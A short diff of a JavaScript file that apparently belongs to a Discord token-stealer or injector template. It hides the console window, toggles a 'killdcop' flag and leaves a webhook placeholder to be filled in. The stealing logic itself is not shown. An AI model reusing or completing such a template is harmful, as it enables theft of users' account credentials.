@@ -15,7 +15,7 @@ const exec = childProcess.exec;
 const hideconsole = require('node-hide-console-window');
 const buf_replace = require('buffer-replace');
 
-let killdcop = true; 
+let killdcop = false; 
 
 
 const %webhookstring% = "REPLACE_YOUR_WEBHOOK";
